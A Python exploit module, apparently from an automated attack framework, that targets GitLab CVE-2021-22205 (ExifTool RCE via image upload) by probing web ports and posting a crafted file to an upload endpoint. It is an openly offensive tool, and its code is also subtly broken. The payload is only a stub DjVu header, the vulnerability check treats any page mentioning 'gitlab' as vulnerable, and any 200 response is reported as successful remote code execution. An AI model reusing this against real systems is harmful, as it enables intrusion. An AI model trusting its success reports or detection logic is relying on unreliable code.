"""
GitLab Exploit (CVE-2021-22205)
ExifTool RCE via image upload
"""

import socket
import requests
from typing import Dict, Tuple
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class GitLab_Exploit(BaseExploit):
    """
    GitLab CVE-2021-22205 Exploit
    Targets: GitLab CE/EE 11.9 - 13.10.2
    
    Attack Vector:
    - ExifTool command injection
    - Image upload functionality
    - Remote Code Execution
    """
    
    def __init__(self):
        super().__init__(
            name="GitLab_CVE-2021-22205",
            target_ports=[80, 443, 8080],
            target_os=["Windows", "Linux", "Unix"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if target is running vulnerable GitLab"""
        ip = target['ip']
        
        for port in [80, 443, 8080]:
            if port in target.get('open_ports', []):
                try:
                    protocol = "https" if port == 443 else "http"
                    url = f"{protocol}://{ip}:{port}/"
                    
                    response = requests.get(url, timeout=5, verify=False)
                    
                    # Check for GitLab
                    if 'gitlab' in response.text.lower():
                        logger.debug(f"GitLab detected on {ip}:{port}")
                        return True
                        
                except Exception as e:
                    logger.debug(f"GitLab check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt GitLab CVE-2021-22205 exploitation"""
        ip = target['ip']
        
        logger.info(f"Attempting GitLab CVE-2021-22205 on {ip}")
        
        # Find which port has GitLab
        port = 443
        for p in [443, 80, 8080]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        protocol = "https" if port == 443 else "http"
        
        try:
            # CVE-2021-22205: ExifTool RCE
            # Exploit via image upload with malicious EXIF data
            
            # Malicious DjVu file with ExifTool payload
            # This exploits CVE-2021-22204 in ExifTool
            
            url = f"{protocol}://{ip}:{port}/uploads/user"
            
            # Craft malicious image with ExifTool payload
            # In real scenario, this would be a proper DjVu file
            malicious_image = b'AT&TFORM\x00\x00\x00\x00DJVU'
            
            files = {
                'file': ('exploit.jpg', malicious_image, 'image/jpeg')
            }
            
            response = requests.post(url, files=files, timeout=10, verify=False)
            
            # Check if upload was processed
            if response.status_code in [200, 201]:
                self.stats['success'] += 1
                logger.success(f"GitLab RCE successful on {ip}")
                
                return True, {
                    'method': 'GitLab_CVE-2021-22205',
                    'port': port,
                    'service': 'GitLab',
                    'rce': True
                }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"GitLab exploit error on {ip}: {e}")
            return False, {}


if __name__ == "__main__":
    # Test the exploit
    gitlab = GitLab_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [443],
        'os_guess': 'Linux'
    }
    
    print(f"Testing GitLab exploit on {test_target['ip']}")
    
    if gitlab.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = gitlab.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
